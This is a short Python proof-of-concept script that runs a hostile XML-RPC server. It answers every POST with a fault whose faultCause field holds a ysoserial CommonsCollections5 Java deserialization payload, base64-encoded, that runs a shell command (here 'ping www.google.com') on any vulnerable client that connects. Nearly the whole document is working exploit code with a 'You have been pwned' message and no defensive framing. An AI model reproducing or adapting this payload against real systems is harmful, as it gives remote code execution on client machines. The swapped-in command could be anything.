#!/usr/bin/env python3

import http.server
import socketserver
import io

'''
this payload has been generated using:
java -jar ysoserial-0.0.6-SNAPSHOT-BETA-all.jar CommonsCollections5 "ping www.google.com" | base64
'''
PING_COMMONS_COLLECTIONS = b'rO0ABXNyAC5qYXZheC5tYW5hZ2VtZW50LkJhZEF0dHJpYnV0ZVZhbHVlRXhwRXhjZXB0aW9u1Ofaq2MtRkACAAFMAAN2YWx0ABJMamF2YS9sYW5nL09iamVjdDt4cgATamF2YS5sYW5nLkV4Y2VwdGlvbtD9Hz4aOxzEAgAAeHIAE2phdmEubGFuZy5UaHJvd2FibGXVxjUnOXe4ywMABEwABWNhdXNldAAVTGphdmEvbGFuZy9UaHJvd2FibGU7TAANZGV0YWlsTWVzc2FnZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sACnN0YWNrVHJhY2V0AB5bTGphdmEvbGFuZy9TdGFja1RyYWNlRWxlbWVudDtMABRzdXBwcmVzc2VkRXhjZXB0aW9uc3QAEExqYXZhL3V0aWwvTGlzdDt4cHEAfgAIcHVyAB5bTGphdmEubGFuZy5TdGFja1RyYWNlRWxlbWVudDsCRio8PP0iOQIAAHhwAAAAA3NyABtqYXZhLmxhbmcuU3RhY2tUcmFjZUVsZW1lbnRhCcWaJjbdhQIACEIABmZvcm1hdEkACmxpbmVOdW1iZXJMAA9jbGFzc0xvYWRlck5hbWVxAH4ABUwADmRlY2xhcmluZ0NsYXNzcQB+AAVMAAhmaWxlTmFtZXEAfgAFTAAKbWV0aG9kTmFtZXEAfgAFTAAKbW9kdWxlTmFtZXEAfgAFTAANbW9kdWxlVmVyc2lvbnEAfgAFeHABAAAAU3QAA2FwcHQAJnlzb3NlcmlhbC5wYXlsb2Fkcy5Db21tb25zQ29sbGVjdGlvbnM1dAAYQ29tbW9uc0NvbGxlY3Rpb25zNS5qYXZhdAAJZ2V0T2JqZWN0cHBzcQB+AAsBAAAANXEAfgANcQB+AA5xAH4AD3EAfgAQcHBzcQB+AAsBAAAAInEAfgANdAAZeXNvc2VyaWFsLkdlbmVyYXRlUGF5bG9hZHQAFEdlbmVyYXRlUGF5bG9hZC5qYXZhdAAEbWFpbnBwc3IAH2phdmEudXRpbC5Db2xsZWN0aW9ucyRFbXB0eUxpc3R6uBe0PKee3gIAAHhweHNyADRvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXlxAH4AAUwAA21hcHQAD0xqYXZhL3V0aWwvTWFwO3hwdAADZm9vc3IAKm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5tYXAuTGF6eU1hcG7llIKeeRCUAwABTAAHZmFjdG9yeXQALExvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnMvVHJhbnNmb3JtZXI7eHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkNoYWluZWRUcmFuc2Zvcm1lcjDHl+woepcEAgABWwANaVRyYW5zZm9ybWVyc3QALVtMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwdXIALVtMb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLlRyYW5zZm9ybWVyO71WKvHYNBiZAgAAeHAAAAAFc3IAO29yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5Db25zdGFudFRyYW5zZm9ybWVyWHaQEUECsZQCAAFMAAlpQ29uc3RhbnRxAH4AAXhwdnIAEWphdmEubGFuZy5SdW50aW1lAAAAAAAAAAAAAAB4cHNyADpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuSW52b2tlclRyYW5zZm9ybWVyh+j/a3t8zjgCAANbAAVpQXJnc3QAE1tMamF2YS9sYW5nL09iamVjdDtMAAtpTWV0aG9kTmFtZXEAfgAFWwALaVBhcmFtVHlwZXN0ABJbTGphdmEvbGFuZy9DbGFzczt4cHVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAJ0AApnZXRSdW50aW1ldXIAEltMamF2YS5sYW5nLkNsYXNzO6sW167LzVqZAgAAeHAAAAAAdAAJZ2V0TWV0aG9kdXEAfgAvAAAAAnZyABBqYXZhLmxhbmcuU3RyaW5noPCkOHo7s0ICAAB4cHZxAH4AL3NxAH4AKHVxAH4ALAAAAAJwdXEAfgAsAAAAAHQABmludm9rZXVxAH4ALwAAAAJ2cgAQamF2YS5sYW5nLk9iamVjdAAAAAAAAAAAAAAAeHB2cQB+ACxzcQB+ACh1cgATW0xqYXZhLmxhbmcuU3RyaW5nO63SVufpHXtHAgAAeHAAAAABdAATcGluZyB3d3cuZ29vZ2xlLmNvbXQABGV4ZWN1cQB+AC8AAAABcQB+ADRzcQB+ACRzcgARamF2YS5sYW5nLkludGVnZXIS4qCk94GHOAIAAUkABXZhbHVleHIAEGphdmEubGFuZy5OdW1iZXKGrJUdC5TgiwIAAHhwAAAAAXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAABAAAAAAeHg='

def create_fault_deser(payload):
  return b'''<?xml version="1.0" encoding="UTF-8"?>
<methodResponse>
  <fault>
    <value>
      <struct>
        <member>
          <name>faultCode</name>
          <value><int>1337</int></value>
        </member>
        <member>
          <name>faultString</name>
          <value><string>You have been pwned</string></value>
        </member>
        <member>
          <name>faultCause</name>
          <value><base64>%s</base64></value>
        </member>
      </struct>
    </value>
  </fault>
</methodResponse>
''' % (payload)

class Handler(http.server.SimpleHTTPRequestHandler):
  def do_POST(self):
    self.send_response(200)
    self.send_header('Content-Type', 'text/xml')
    self.end_headers()

    self.wfile.write(create_fault_deser(PING_COMMONS_COLLECTIONS))

httpd = socketserver.TCPServer(('127.0.0.1', 8888), Handler)
httpd.serve_forever()

